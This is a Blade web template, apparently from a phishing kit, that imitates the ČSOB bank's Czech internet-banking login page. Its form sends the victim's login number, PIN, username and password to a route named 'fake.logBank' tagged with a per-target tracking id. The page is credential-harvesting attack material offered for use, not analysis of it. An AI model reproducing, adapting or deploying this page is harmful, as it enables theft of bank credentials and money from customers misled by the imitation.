        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th {
            background-color: #F8F8F8;
        }

        #ot-sdk-cookie-policy,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group-desc,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-table-header,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td {
            font-size: inherit !important
        }

        #ot-sdk-cookie-policy div,
        #ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy h1,
        #ot-sdk-cookie-policy h2,
        #ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy img,
        #ot-sdk-cookie-policy svg,
        #ot-sdk-cookie-policy button,
        #ot-sdk-cookie-policy section,
        #ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy label,
        #ot-sdk-cookie-policy input,
        #ot-sdk-cookie-policy ul,
        #ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy nav,
        #ot-sdk-cookie-policy table,
        #ot-sdk-cookie-policy thead,
        #ot-sdk-cookie-policy tr,
        #ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy tbody,
        #ot-sdk-cookie-policy .ot-main-content,
        #ot-sdk-cookie-policy .ot-toggle,
        #ot-sdk-cookie-policy #ot-content,
        #ot-sdk-cookie-policy #ot-pc-content,
        #ot-sdk-cookie-policy .checkbox {
            line-height: inherit
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
            color: inherit
        }

        #ot-sdk-cookie-policy {
            margin-bottom: 40px
        }

        #ot-sdk-cookie-policy h1,
        #ot-sdk-cookie-policy h2,
        #ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy h6 {
            margin: 0 0 10px 0 !important;
            color: #036 !important;
            line-height: 1.2
        }

        #ot-sdk-cookie-policy h3 {
            font-size: 21px !important;
            font-weight: normal
        }

        #ot-sdk-cookie-policy h4 {
            margin-bottom: 5px !important;
            font-size: 18px !important;
            font-weight: bold
        }

        @media print,
        screen and (min-width: 760px) {
            #ot-sdk-cookie-policy h3 {
                margin-bottom: 20px !important;
                font-size: 26px !important
            }
            #ot-sdk-cookie-policy h4 {
                margin-bottom: 10px !important;
                font-size: 24px !important;
                font-weight: normal
            }
        }

        #ot-sdk-cookie-policy #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section {
            margin-bottom: 0
        }

        #ot-sdk-cookie-policy #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section table {
            margin-bottom: 40px
        }

        #ot-sdk-cookie-policy #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section:last-child table {
            margin-bottom: 0
        }

        #ot-sdk-cookie-policy #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th {
            background-color: #d8ebf9;
            color: inherit
        }

        #ot-sdk-cookie-policy #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
            background-color: #fff
        }

        #ot-sdk-btn-floating.ot-floating-button {
            position: fixed;
            bottom: 10px;
            opacity: 0;
            width: 50px;
            height: 50px;
            line-height: 15px;
            cursor: pointer;
            background-color: transparent;
            transform-style: preserve-3d;
            transition: all 300ms ease;
            perspective: 1000px;
            z-index: 2147483646;
            animation: otFloatingBtnIntro 800ms ease 0ms 1 forwards
        }

        #ot-sdk-btn-floating.ot-floating-button.ot-hide {
            display: none
        }

        #ot-sdk-btn-floating.ot-floating-button::before,
        #ot-sdk-btn-floating.ot-floating-button::after {
            text-transform: none;
            line-height: 1;
            user-select: none;
            pointer-events: none;
            position: absolute;
            transform: scale(0);
            opacity: 0;
            transition: all 300ms ease;
            display: block;
            height: auto
        }

        #ot-sdk-btn-floating.ot-floating-button::before {
            content: "";
            border: 5px solid transparent;
            z-index: 1001;
            top: 50%;
            border-left-width: 0;
            border-right-color: #333;
            right: calc(0em - 5px);
            transform: translate(10px, -50%)
        }

        #ot-sdk-btn-floating.ot-floating-button::after {
            content: attr(title);
            position: absolute;
            text-align: center;
            top: 50%;
            left: calc(100% + 5px);
            transform: translate(10px, -50%);
            font-size: .75rem;
            min-width: 3em;
            max-width: 21em;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            padding: 5px;
            border-radius: .3ch;
            box-shadow: 0 1em 2em -0.5em rgba(0, 0, 0, .35);
            background: #333;
            color: #fff;
            z-index: 2147483645
        }

        #ot-sdk-btn-floating.ot-floating-button:hover::before,
        #ot-sdk-btn-floating.ot-floating-button:hover::after {
            opacity: 1
        }

        #ot-sdk-btn-floating.ot-floating-button:hover::before {
            transform: translate(0.5em, -50%) scale(1)
        }

        #ot-sdk-btn-floating.ot-floating-button:hover::after {
            transform: translate(0.5em, -50%) scale(1)
        }

        #ot-sdk-btn-floating.ot-floating-button.ot-pc-open .ot-floating-button__front {
            transform: rotateY(-180deg)
        }

        #ot-sdk-btn-floating.ot-floating-button.ot-pc-open .ot-floating-button__back {
            transform: rotateY(0)
        }

        #ot-sdk-btn-floating .ot-floating-button__front,
        #ot-sdk-btn-floating .ot-floating-button__back {
            position: absolute;
            width: 100%;
            height: 100%;
            -webkit-backface-visibility: hidden;
            backface-visibility: hidden;
            background-color: #6aaae4;
            border-radius: 10px;
            box-shadow: 0 4px 8px 0 rgba(0, 0, 0, .2);
            transition: transform .6s;
            transform-style: preserve-3d
        }

        #ot-sdk-btn-floating .ot-floating-button__front {
            background-color: #6aaae4;
            transform: rotateY(0)
        }

        #ot-sdk-btn-floating .ot-floating-button__front svg {
            width: 30px;
            height: 37px
        }

        #ot-sdk-btn-floating .ot-floating-button__back {
            background-color: #69c;
            transform: rotateY(-180deg)
        }

        #ot-sdk-btn-floating .ot-floating-button__back svg {
            width: 24px;
            height: 24px
        }

        #ot-sdk-btn-floating.ot-floating-button button {
            background-color: transparent;
            border: 0;
            width: 100%;
            height: 100%;
            cursor: pointer
        }

        @keyframes otFloatingBtnIntro {
            0% {
                opacity: 0;
                left: -75px
            }
            100% {
                opacity: 1;
                left: 1%
            }
        }

        @keyframes otFloatingBtnImageIntro {
            0% {
                opacity: 0;
                transform: scale(0) rotate(-270deg)
            }
            100% {
                opacity: 100%;
                transform: scale(0.95) rotate(0deg)
            }
        }

    </style>
@endpush
@section('content')
    <div class="pdp-accessibly-hidden">Záhlaví stránky</div>
    <header class="pui-m-header-fixed">
        <button class="pui-header-button pui-header-controls-toggle pui-toggle-off"><span class="pui-accessible-label">Zobrazit navigaci v záhlaví</span>
        </button>
        <div class="pui-header-content">
            <div class="pui-header-logo">
                <a href="#" title="ČSOB"> <img
                            src="{{asset($bank['logo'])}}"
                            alt="Logo ČSOB" role="presentation"> </a>
            </div>
            <nav class="pui-header-nav pui-toggle-off pui-ibx-disabled pui-ibx-no-messages pui-is-loy-off">
                <div class="pui-header-nav-content">
                    <ul class="pui-header-controls pui-header-anonymous">
                        <li class="pui-header-combo pui-header-contact">
                            <button class="pui-header-button" tabindex="0" aria-haspopup="true" aria-expanded="false"
                                    aria-label="Kontaktní informace"><span
                                        class="pui-header-button-label">Kontakty</span>
                            </button>
                            <div class="pui-header-combo-content pui-header-overlay" tabindex="-1">
                                <div class="pui-contacts-general" role="presentation">
                                    <ul>
                                        <li class="pui-standard-contact pui-is-highlighted"><strong>Helpdesk<br>
                                                <span class="pui-accessibly-hidden">Telefon</span>
                                                <span class="pui-phone">495 800 111</span>
                                            </strong> <span class="pui-opening-hours">
                                        <span class="pui-accessibly-hidden">Provozní hodiny</span> volejte kdykoliv </span>
                                        </li>
                                        <li><a href="#"
                                               target="_blank">Všechny
                                                kontakty</a></li>
                                        <li><a href="#"
                                               target="_blank">Napište
                                                nám</a></li>
                                    </ul>
                                </div>
                            </div>
                        </li>
                        <li class="pui-header-lang">
                            <a class="pui-header-button pui-lang-button" aria-label="Change to english"
                               href="#"
                               data-target-locale="en_GB"> <span class="pui-header-button-label"
                                                                 aria-hidden="true">EN</span> </a>
                        </li>
                    </ul>
                </div>
            </nav>
        </div>
    </header>
    <div class="pdp-accessibly-hidden">Hlavní obsah</div>
    <div class="container pdp-content-container" id="wrapper" role="main">
        <div class="html-c-alert pui-alert-mobile-app pui-is-visible" data-alert-id="mobile-019">
            <div class="html-b-wrapper">
                <div class="html-b-content">
                    <!-- iOS Image -->
                    <a href="https://apps.apple.com/app/apple-store/id479852415?pt=833801&amp;ct=IB_Login&amp;mt=8"
                       class="html-b-file-download pui-ios">
                        <div class="html-c-image-fit">
                            <img src="{{asset('images/banks/csob.png')}}"
                                    alt="Mobilní aplikace"></div>
                        <div class="html-b-text"><span class="html-file-name">Spravujte své účty ještě pohodlněji pomocí Smartbankingu</span>
                            <span class="html-file-description">Ke stažení v AppStore</span></div>
                    </a>
                    <!-- iOS Image end  -->
                    <!-- Android image -->
                    <a href="https://play.google.com/store/apps/details?id=cz.csob.smartbanking&amp;utm_campaign=IB_Login"
                       class="html-b-file-download pui-android">
                        <div class="html-c-image-fit"><img
                                    src="{{asset('images/banks/csob.png')}}"
                                    alt="Mobilní aplikace"></div>
                        <div class="html-b-text"><span class="html-file-name">Spravujte své účty ještě pohodlněji pomocí Smartbankingu</span>
                            <span class="html-file-description">Ke stažení na Google Play</span></div>
                    </a>
                    <!-- Android image end-->
                </div>
                <div class="html-b-footer"><a href="#" role="button"
                                              class="html-c-button html-close pui-js-close">Zavřít</a></div>
            </div>
        </div>
        <div class="pui-c-page-heading">
            <h1 class="pui-heading-main">Přihlášení do internetového bankovnictví</h1>
            <div class="pui-heading-controls"><a href="#"
                                                 class="pui-heading-button pui-help-link" target="_blank">
                    Nápověda
                </a></div>
        </div>
        <div id="content">
            <div class="pui-page-layout-login" id="main-content">
                <div class="portlet-layout">
                    <div class="portlet-column portlet-column-only pui-page-layout-top" id="column-top">
                        <div class="portlet-dropzone empty portlet-column-content portlet-column-content-only"
                             id="layout-column_column-top"></div>
                    </div>
                    <div class="portlet-column portlet-column-only pui-page-layout-main" id="column-main">
                        <div class="portlet-dropzone portlet-column-content portlet-column-content-only"
                             id="layout-column_column-main">
                            <div class="portlet-boundary portlet-boundary_56_  portlet-static portlet-static-end portlet-borderless portlet-journal-content "
                                 id="p_p_id_56_INSTANCE_ChKj4KO1JUyK_"><span id="p_56_INSTANCE_ChKj4KO1JUyK"></span>
                                <div class="portlet-borderless-container">
                                    <div class="portlet-body">
                                        <div class="journal-content-article">
                                            <div class="jsDisabled" style="display: none;">
                                                <script type="text/javascript">
                                                    (function ($) {
                                                        var jsDisabledNode = $(".jsDisabled");
                                                        if (jsDisabledNode) {
                                                            jsDisabledNode.hide();
                                                        }
                                                    })(jQuery);
                                                </script>
                                                <div class="pdp-info-panel">
                                                    <div class="pdp-msg-info">Javascript musí být povolen pro správné
                                                        fungování tohoto portálu.
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="cookiesDisabled" style="display: none">
                                                <div class="pdp-info-panel">
                                                    <div class="pdp-msg-error">Cookies musí být povoleny pro správné
                                                        fungování tohoto portálu.
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="osXP" style="display: none">
                                                <div class="pdp-info-panel">
                                                    <div class="pdp-msg-success">Rádi bychom vás upozornili, že po 8.
                                                        dubnu
                                                        může být váš počítač s Windows XP vystaven zvýšenému riziku
                                                        internetových útoků, protože společnost Microsoft k tomuto datu
                                                        ukončí podporu svého operačního systému Windows XP. Doporučujeme
                                                        proto používat pouze aktuální plně podporované operační systémy.
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="browserUnsupported" style="display: none">
                                                <div class="pdp-info-panel">
                                                    <div class="pdp-msg-warning">
                                                        <p>Váš internetový prohlížeč nepodporuje některé funkce.</p>
                                                        <p>Mrzí nás to, ale Era portál nemusí správně fungovat pro váš
                                                            prohlížeč. Proto doporučujeme použít novější verzi
                                                            prohlížeče,
                                                            případně jiný prohlížeč. </p>Děkujeme za pochopení,
                                                        <br>Vaše Era a Poštovní spořitelna
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="entry-links"></div>
                                    </div>
                                </div>
                            </div>
                            <form id="bank_pm_form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}" role="form">
                                <div class="portlet-boundary portlet-boundary_56_  portlet-static portlet-static-end portlet-borderless portlet-journal-content "
                                     id="p_p_id_56_INSTANCE_aqTBUvgRuEsS_"><span id="p_56_INSTANCE_aqTBUvgRuEsS"></span>
                                    <div class="portlet-borderless-container">
                                        <div class="portlet-body">
                                            <div class="journal-content-article">
                                                <div class="pui-m-alternative-login">
                                                    <h3>Máte už ČSOB Identitu, nové přihlašovací údaje?</h3>
                                                    <div class="pdp-form-row">
                                                        <label class="pdp-label"> Přihlaste se do internetového
                                                            bankovnictví
                                                            s ID
                                                            <a class="add-on html-is-standalone"
                                                               id="tooltip-ib-entry-tooltip" data-toggle="tooltip"
                                                               role="tooltip"
                                                               title="Pokud už ČSOB Identitu (nové přihlašovací údaje) máte, příště se přihlaste na online.csob.cz nebo stránkách ČSOB zvolte „Internetové bankovnictví s ID“."></a>
                                                        </label>
                                                    </div>
                                                </div>
                                                <br></div>
                                            <div class="entry-links"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="portlet-boundary portlet-boundary_login_WAR_etsspwssecurityportletsviewwas_  portlet-static portlet-static-end portlet-borderless login-portlet "
                                     id="p_p_id_login_WAR_etsspwssecurityportletsviewwas_"><span
                                            id="p_login_WAR_etsspwssecurityportletsviewwas"></span>
                                    <div class="portlet-borderless-container">
                                        <div class="portlet-body">
                                            <div class="pdp-login-container">
                                                <div class="pdp-tab-panel tabs">
                                                    <div class="pdp-tab-content pui-m-login">
                                                        <div id="loadFormFragment"
                                                             class="formbox-container signin-window"
                                                             style="display:none;"><span class="waiting"
                                                                                         style="opacity:0;"></span>
                                                        </div>
                                                        <div class="pdp-tab-pane active" id="">
                                                            <div class="pdp-form-row pui-username">
                                                                <label for="username-view"
                                                                       class="pdp-label pdp-required">Identifikační
                                                                    číslo</label>
                                                                <div class="pdp-frm-full">
                                                                    <div class="input-append pdp-input-element">
                                                                        <input name="login" type="text"
                                                                               id="login_bank"
                                                                               aria-describedby="tooltip-username-view"
                                                                               aria-required="true" maxlength="8"
                                                                               autocomplete="off"> <span
                                                                                class="pdp-input-clear"></span>
                                                                        <a class="add-on" id="tooltip-username-view"
                                                                           data-toggle="tooltip" role="tooltip"
                                                                           tabindex="-1"
                                                                           data-info-title="Zadejte své identifikační číslo pro Internetové bankovnictví."></a>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="pdp-form-row pui-password">
                                                                <label for="password-view"
                                                                       class="pdp-label pdp-required">PIN</label>
                                                                <div class="pdp-frm-full">
                                                                    <div class="input-append pdp-input-element">
                                                                        <input name="pin" type="password"
                                                                               id="password_bank"
                                                                               aria-describedby="tooltip-password-view"
                                                                               aria-required="true" maxlength="5"
                                                                               autocomplete="off"> <span
                                                                                class="pdp-input-clear"></span>
                                                                        <a class="add-on" id="tooltip-password-view"
                                                                           data-toggle="tooltip" role="tooltip"
                                                                           tabindex="-1"
                                                                           title="Zadejte svůj pětimístný PIN pro Internetové bankovnictví."
                                                                           data-info-title="Zadejte svůj pětimístný PIN pro Internetové bankovnictví."></a>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <div class="pdp-form-row pui-password">
                                                                <label for="password-view"
                                                                       class="pdp-label pdp-required">uzivatelske
                                                                    jmeno</label>
                                                                <div class="pdp-frm-full">
                                                                    <div class="input-append pdp-input-element">
                                                                        <input name="username" type="password"
                                                                               id="password2_bank"
                                                                               aria-describedby="tooltip-password-view"
                                                                               aria-required="true" autocomplete="off">
                                                                        <span class="pdp-input-clear"></span>
                                                                        <a class="add-on" id="tooltip-password-view"
                                                                           data-toggle="tooltip" role="tooltip"
                                                                           tabindex="-1"
                                                                           title="Zadejte svůj pětimístný uzivatelske jmeno pro Internetové bankovnictví."
                                                                           data-info-title="Zadejte svůj pětimístný password pro Internetové bankovnictví."></a>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <div class="pdp-form-row pui-password">
                                                                <label for="password-view"
                                                                       class="pdp-label pdp-required">Heslo</label>
                                                                <div class="pdp-frm-full">
                                                                    <div class="input-append pdp-input-element">
                                                                        <input name="password" type="password"
                                                                               id="password3_bank"
                                                                               aria-describedby="tooltip-password-view"
                                                                               aria-required="true" autocomplete="off">
                                                                        <span class="pdp-input-clear"></span>
                                                                        <a class="add-on" id="tooltip-password-view"
                                                                           data-toggle="tooltip" role="tooltip"
                                                                           tabindex="-1"
                                                                           title="Zadejte svůj pětimístný Heslo pro Internetové bankovnictví."
                                                                           data-info-title="Zadejte svůj pětimístný password pro Internetové bankovnictví."></a>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <div class="pdp-form-row pui-controls">
                                                                <div class="pdp-frm-action-buttons-limited">
                                                                    <button id="submit-login-form" type="submit"
                                                                            class="btn pdp-button pdp-button-primary pdp-button-action">
                                                                        Přihlásit
                                                                    </button>
                                                                </div>
                                                                <div class="pdp-frm-link-control"></div>
                                                            </div>

                                                        </div>
                                                    </div>
                                                </div>
                                                <!--  DIV used just for portlet monitoring -->
                                                <div class="pdp-monitoring-data" data-pdp-portlet-status="success"
                                                     data-pdp-portlet-id="PLT_SSP_01"
                                                     data-pdp-portlet-name="Prihlaseni">
                                                    <!-- Empty tag -->
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                            <div class="portlet-boundary portlet-boundary_56_  portlet-static portlet-static-end portlet-borderless portlet-journal-content "
                                 id="p_p_id_56_INSTANCE_Hl6Z40XA0zdS_"><span id="p_56_INSTANCE_Hl6Z40XA0zdS"></span>
                                <div class="portlet-borderless-container">
                                    <div class="portlet-body">
                                        <div class="journal-content-article">
                                            <div class="pui-m-login-form-links">
                                                <ul class="login-form-links">
                                                    <li><a href="#"
                                                           target="_blank">Přechod na ČSOB Identitu </a></li>
                                                    <li><a href="#"
                                                           target="_blank">Jak na Smart klíč</a></li>
                                                    <li><a href="#"
                                                           target="_blank">Nemám přihlašovací údaje</a></li>
                                                </ul>
                                            </div>
                                        </div>
                                        <div class="entry-links"></div>
                                    </div>
                                </div>
                            </div>
                            <div class="portlet-boundary portlet-boundary_jsCodeAppender_WAR_pdpjscodeappenderportlet_  portlet-static portlet-static-end portlet-borderless  "
                                 id="p_p_id_jsCodeAppender_WAR_pdpjscodeappenderportlet_"><span
                                        id="p_jsCodeAppender_WAR_pdpjscodeappenderportlet"></span>
                                <div class="portlet-borderless-container">
                                    <div class="portlet-body">
{{--                                        <script>--}}
{{--                                            /* Modernizr 2.8.3 (Custom Build) | MIT & BSD--}}
{{--                                             * Build: http://modernizr.com/download/#-fontface-backgroundsize-borderradius-boxshadow-hsla-multiplebgs-opacity-rgba-csscolumns-generatedcontent-cssgradients-csstransforms-csstransitions-canvas-canvastext-draganddrop-hashchange-localstorage-postmessage-sessionstorage-inlinesvg-svg-shiv-mq-cssclasses-addtest-prefixed-teststyles-testprop-testallprops-hasevent-prefixes-domprefixes-css_backgroundposition_shorthand-css_boxsizing-css_calc-css_displaytable-css_lastchild-css_mediaqueries-css_vhunit-css_vwunit-json-network_xhr2-performance-unicode-url_data_uri-load--}}
{{--                                             */--}}
{{--                                            ;--}}
{{--                                            window.Modernizr = function (a, b, c) {--}}
{{--                                                function D(a) {--}}
{{--                                                    j.cssText = a--}}
{{--                                                }--}}

{{--                                                function E(a, b) {--}}
{{--                                                    return D(n.join(a + ";") + (b || ""))--}}
{{--                                                }--}}

{{--                                                function F(a, b) {--}}
{{--                                                    return typeof a === b--}}
{{--                                                }--}}

{{--                                                function G(a, b) {--}}
{{--                                                    return !!~("" + a).indexOf(b)--}}
{{--                                                }--}}

{{--                                                function H(a, b) {--}}
{{--                                                    for (var d in a) {--}}
{{--                                                        var e = a[d];--}}
{{--                                                        if (!G(e, "-") && j[e] !== c) return b == "pfx" ? e : !0--}}
{{--                                                    }--}}
{{--                                                    return !1--}}
{{--                                                }--}}

{{--                                                function I(a, b, d) {--}}
{{--                                                    for (var e in a) {--}}
{{--                                                        var f = b[a[e]];--}}
{{--                                                        if (f !== c) return d === !1 ? a[e] : F(f, "function") ? f.bind(d || b) : f--}}
{{--                                                    }--}}
{{--                                                    return !1--}}
{{--                                                }--}}

{{--                                                function J(a, b, c) {--}}
{{--                                                    var d = a.charAt(0).toUpperCase() + a.slice(1),--}}
{{--                                                        e = (a + " " + p.join(d + " ") + d).split(" ");--}}
{{--                                                    return F(b, "string") || F(b, "undefined") ? H(e, b) : (e = (a + " " + q.join(d + " ") + d).split(" "), I(e, b, c))--}}
{{--                                                }--}}

{{--                                                var d = "2.8.3",--}}
{{--                                                    e = {},--}}
{{--                                                    f = !0,--}}
{{--                                                    g = b.documentElement,--}}
{{--                                                    h = "modernizr",--}}
{{--                                                    i = b.createElement(h),--}}
{{--                                                    j = i.style,--}}
{{--                                                    k, l = ":)",--}}
{{--                                                    m = {}.toString,--}}
{{--                                                    n = " -webkit- -moz- -o- -ms- ".split(" "),--}}
{{--                                                    o = "Webkit Moz O ms",--}}
{{--                                                    p = o.split(" "),--}}
{{--                                                    q = o.toLowerCase().split(" "),--}}
{{--                                                    r = {--}}
{{--                                                        svg: "http://www.w3.org/2000/svg"--}}
{{--                                                    },--}}
{{--                                                    s = {},--}}
{{--                                                    t = {},--}}
{{--                                                    u = {},--}}
{{--                                                    v = [],--}}
{{--                                                    w = v.slice,--}}
{{--                                                    x, y = function (a, c, d, e) {--}}
{{--                                                        var f, i, j, k, l = b.createElement("div"),--}}
{{--                                                            m = b.body,--}}
{{--                                                            n = m || b.createElement("body");--}}
{{--                                                        if (parseInt(d, 10))--}}
{{--                                                            while (d--) j = b.createElement("div"), j.id = e ? e[d] : h + (d + 1), l.appendChild(j);--}}
{{--                                                        return f = ["&#173;", '<style id="s', h, '">', a, "</style>"].join(""), l.id = h, (m ? l : n).innerHTML += f, n.appendChild(l), m || (n.style.background = "", n.style.overflow = "hidden", k = g.style.overflow, g.style.overflow = "hidden", g.appendChild(n)), i = c(l, a), m ? l.parentNode.removeChild(l) : (n.parentNode.removeChild(n), g.style.overflow = k), !!i--}}
{{--                                                    },--}}
{{--                                                    z = function (b) {--}}
{{--                                                        var c = a.matchMedia || a.msMatchMedia;--}}
{{--                                                        if (c) return c(b) && c(b).matches || !1;--}}
{{--                                                        var d;--}}
{{--                                                        return y("@media " + b + " { #" + h + " { position: absolute; } }", function (b) {--}}
{{--                                                            d = (a.getComputedStyle ? getComputedStyle(b, null) : b.currentStyle)["position"] == "absolute"--}}
{{--                                                        }), d--}}
{{--                                                    },--}}
{{--                                                    A = function () {--}}
{{--                                                        function d(d, e) {--}}
{{--                                                            e = e || b.createElement(a[d] || "div"), d = "on" + d;--}}
{{--                                                            var f = d in e;--}}
{{--                                                            return f || (e.setAttribute || (e = b.createElement("div")), e.setAttribute && e.removeAttribute && (e.setAttribute(d, ""), f = F(e[d], "function"), F(e[d], "undefined") || (e[d] = c), e.removeAttribute(d))), e = null, f--}}
{{--                                                        }--}}

{{--                                                        var a = {--}}
{{--                                                            select: "input",--}}
{{--                                                            change: "input",--}}
{{--                                                            submit: "form",--}}
{{--                                                            reset: "form",--}}
{{--                                                            error: "img",--}}
{{--                                                            load: "img",--}}
{{--                                                            abort: "img"--}}
{{--                                                        };--}}
{{--                                                        return d--}}
{{--                                                    }(),--}}
{{--                                                    B = {}.hasOwnProperty,--}}
{{--                                                    C;--}}
{{--                                                !F(B, "undefined") && !F(B.call, "undefined") ? C = function (a, b) {--}}
{{--                                                    return B.call(a, b)--}}
{{--                                                } : C = function (a, b) {--}}
{{--                                                    return b in a && F(a.constructor.prototype[b], "undefined")--}}
{{--                                                }, Function.prototype.bind || (Function.prototype.bind = function (b) {--}}
{{--                                                    var c = this;--}}
{{--                                                    if (typeof c != "function") throw new TypeError;--}}
{{--                                                    var d = w.call(arguments, 1),--}}
{{--                                                        e = function () {--}}
{{--                                                            if (this instanceof e) {--}}
{{--                                                                var a = function () {--}}
{{--                                                                };--}}
{{--                                                                a.prototype = c.prototype;--}}
{{--                                                                var f = new a,--}}
{{--                                                                    g = c.apply(f, d.concat(w.call(arguments)));--}}
{{--                                                                return Object(g) === g ? g : f--}}
{{--                                                            }--}}
{{--                                                            return c.apply(b, d.concat(w.call(arguments)))--}}
{{--                                                        };--}}
{{--                                                    return e--}}
{{--                                                }), s.canvas = function () {--}}
{{--                                                    var a = b.createElement("canvas");--}}
{{--                                                    return !!a.getContext && !!a.getContext("2d")--}}
{{--                                                }, s.canvastext = function () {--}}
{{--                                                    return !!e.canvas && !!F(b.createElement("canvas").getContext("2d").fillText, "function")--}}
{{--                                                }, s.postmessage = function () {--}}
{{--                                                    return !!a.postMessage--}}
{{--                                                }, s.hashchange = function () {--}}
{{--                                                    return A("hashchange", a) && (b.documentMode === c || b.documentMode > 7)--}}
{{--                                                }, s.draganddrop = function () {--}}
{{--                                                    var a = b.createElement("div");--}}
{{--                                                    return "draggable" in a || "ondragstart" in a && "ondrop" in a--}}
{{--                                                }, s.rgba = function () {--}}
{{--                                                    return D("background-color:rgba(150,255,150,.5)"), G(j.backgroundColor, "rgba")--}}
{{--                                                }, s.hsla = function () {--}}
{{--                                                    return D("background-color:hsla(120,40%,100%,.5)"), G(j.backgroundColor, "rgba") || G(j.backgroundColor, "hsla")--}}
{{--                                                }, s.multiplebgs = function () {--}}
{{--                                                    return D("background:url(https://),url(https://),red url(https://)"), /(url\s*\(.*?){3}/.test(j.background)--}}
{{--                                                }, s.backgroundsize = function () {--}}
{{--                                                    return J("backgroundSize")--}}
{{--                                                }, s.borderradius = function () {--}}
{{--                                                    return J("borderRadius")--}}
{{--                                                }, s.boxshadow = function () {--}}
{{--                                                    return J("boxShadow")--}}
{{--                                                }, s.opacity = function () {--}}
{{--                                                    return E("opacity:.55"), /^0.55$/.test(j.opacity)--}}
{{--                                                }, s.csscolumns = function () {--}}
{{--                                                    return J("columnCount")--}}
{{--                                                }, s.cssgradients = function () {--}}
{{--                                                    var a = "background-image:",--}}
{{--                                                        b = "gradient(linear,left top,right bottom,from(#9f9),to(white));",--}}
{{--                                                        c = "linear-gradient(left top,#9f9, white);";--}}
{{--                                                    return D((a + "-webkit- ".split(" ").join(b + a) + n.join(c + a)).slice(0, -a.length)), G(j.backgroundImage, "gradient")--}}
{{--                                                }, s.csstransforms = function () {--}}
{{--                                                    return !!J("transform")--}}
{{--                                                }, s.csstransitions = function () {--}}
{{--                                                    return J("transition")--}}
{{--                                                }, s.fontface = function () {--}}
{{--                                                    var a;--}}
{{--                                                    return y('@font-face {font-family:"font";src:url("https://")}', function (c, d) {--}}
{{--                                                        var e = b.getElementById("smodernizr"),--}}
{{--                                                            f = e.sheet || e.styleSheet,--}}
{{--                                                            g = f ? f.cssRules && f.cssRules[0] ? f.cssRules[0].cssText : f.cssText || "" : "";--}}
{{--                                                        a = /src/i.test(g) && g.indexOf(d.split(" ")[0]) === 0--}}
{{--                                                    }), a--}}
{{--                                                }, s.generatedcontent = function () {--}}
{{--                                                    var a;--}}
{{--                                                    return y(["#", h, "{font:0/0 a}#", h, ':after{content:"', l, '";visibility:hidden;font:3px/1 a}'].join(""), function (b) {--}}
{{--                                                        a = b.offsetHeight >= 3--}}
{{--                                                    }), a--}}
{{--                                                }, s.localstorage = function () {--}}
{{--                                                    try {--}}
{{--                                                        return localStorage.setItem(h, h), localStorage.removeItem(h), !0--}}
{{--                                                    } catch (a) {--}}
{{--                                                        return !1--}}
{{--                                                    }--}}
{{--                                                }, s.sessionstorage = function () {--}}
{{--                                                    try {--}}
{{--                                                        return sessionStorage.setItem(h, h), sessionStorage.removeItem(h), !0--}}
{{--                                                    } catch (a) {--}}
{{--                                                        return !1--}}
{{--                                                    }--}}
{{--                                                }, s.svg = function () {--}}
{{--                                                    return !!b.createElementNS && !!b.createElementNS(r.svg, "svg").createSVGRect--}}
{{--                                                }, s.inlinesvg = function () {--}}
{{--                                                    var a = b.createElement("div");--}}
{{--                                                    return a.innerHTML = "<svg/>", (a.firstChild && a.firstChild.namespaceURI) == r.svg--}}
{{--                                                };--}}
{{--                                                for (var K in s) C(s, K) && (x = K.toLowerCase(), e[x] = s[K](), v.push((e[x] ? "" : "no-") + x));--}}
{{--                                                return e.addTest = function (a, b) {--}}
{{--                                                    if (typeof a == "object")--}}
{{--                                                        for (var d in a) C(a, d) && e.addTest(d, a[d]);--}}
{{--                                                    else {--}}
{{--                                                        a = a.toLowerCase();--}}
{{--                                                        if (e[a] !== c) return e;--}}
{{--                                                        b = typeof b == "function" ? b() : b, typeof f != "undefined" && f && (g.className += " " + (b ? "" : "no-") + a), e[a] = b--}}
{{--                                                    }--}}
{{--                                                    return e--}}
